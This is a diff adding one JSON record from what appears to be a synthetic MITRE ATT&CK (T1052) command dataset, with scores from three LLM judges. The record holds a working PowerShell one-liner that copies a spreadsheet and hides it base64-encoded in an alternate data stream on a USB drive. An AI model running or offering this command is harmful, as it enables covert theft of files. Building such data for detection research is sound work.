@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $carrier=Join-Path $usb 'thumbs.db'; if(-not (Test-Path $carrier)){ [IO.File]::WriteAllBytes($carrier,[byte[]]@()) }; [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\Budget.xlsx')) | Out-File -Encoding ASCII ($carrier+':cache')",
+  "explanation": "Stashes base64-encoded content inside an alternate data stream on a file located on the USB device.",
+  "rationale_steps": [
+    "Ensure carrier file exists on removable media",
+    "Base64-encode sensitive file",
+    "Write encoded data to NTFS alternate data stream on USB"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-d8a0c7ce",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced quotes/parentheses, proper separators, and correct use of cmdlets and .NET methods and parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "It locates a removable drive, creates a carrier file, and writes base64 data to an alternate data stream consistent with physical exfiltration and hiding, but it assumes a present NTFS-formatted USB and will fail on non-NTFS or absent removable media.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:11:55.002128Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax, and appropriate variable assignments and method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by identifying a removable drive, creating a thumbs.db file as a carrier, and exfiltrating data from Budget.xlsx by encoding it as base64 and hiding it in an alternate data stream, which is a realistic implementation of exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:11:57.846220Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct PowerShell cmdlet usage, .NET calls, variable assignments, and proper Alternate Data Stream (ADS) syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly locates a removable drive, creates or targets a 'thumbs.db' file, base64-encodes a plausible target file, and stashes the encoded data in an ADS on the USB, perfectly aligning with T1052 for stealthy data exfiltration via physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:12:10.556686Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
